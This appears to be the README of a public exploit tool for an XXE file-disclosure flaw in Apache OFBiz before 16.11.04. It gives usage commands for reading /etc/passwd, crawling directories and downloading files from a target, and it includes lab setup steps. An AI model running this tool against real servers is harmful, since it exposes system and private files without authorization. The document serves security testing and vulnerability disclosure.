# Apache OFBiz XXE
XXE injection (file disclosure) exploit for Apache OFBiz &lt; 16.11.04

## Information
Apache OFBiz, before version 16.11.04, contains two distinct XXE injection vulnerabilities. The public disclosures for each vulnerability can be found below:

* [1] https://seclists.org/oss-sec/2018/q4/12
* [2] https://seclists.org/oss-sec/2018/q4/13

This exploit targets the vulnerability disclosed in link 1. Although this vulnerability was not assigned a CVE (the root cause lies in an outdated library), it is easier to exploit than the vulnerability disclosed in link 2 (CVE-2018-8033), which requires hosting an external DTD that the vulnerable server must reference in each request.

## Usage
### Display a single file
```
$ python exploit.py -u https://localhost:8443 -f /etc/passwd
```
### Crawl through directories
```
$ python exploit.py -u https://localhost:8443 -c /home/bob

[*] DIR: /home/bob
[*] DIR: /home/bob/docs
[*] FILE: /home/bob/docs/proposal.docx
[*] DIR: /home/bob/stuff
[*] DIR: /home/bob/stuff/more-stuff
[*] FILE: /home/bob/stuff/more-stuff/file2.txt
[*] FILE: /home/bob/stuff/more-stuff/secret.txt
[*] FILE: /home/bob/stuff/file3.txt
[*] FILE: /home/bob/file.txt
```
### Download a single file
```
$ python exploit.py -u https://localhost:8443 -f /home/bob/stuff/more-stuff/secret.txt -o ~/local/
$ ls ~/local/
home--bob--stuff--more-stuff--secret.txt
```

## OFBiz setup
Follow the steps below to setup OFBiz 16.11.04 in order to test this exploit. This was performed on Ubuntu.
```
$ sudo add-apt-repository ppa:webupd8team/java
$ sudo apt install oracle-java8-installer 
$ sudo update-alternatives --config java

$ wget https://archive.apache.org/dist/ofbiz/apache-ofbiz-16.11.04.zip
$ unzip apache-ofbiz-16.11.04.zip
$ cd apache-ofbiz-16.11.04/

$ ./gradlew cleanAll loadDefault
$ ./gradlew ofbiz
```
Browse to https://<ip:8443/ordermgr/control/main to make sure the installation was successful
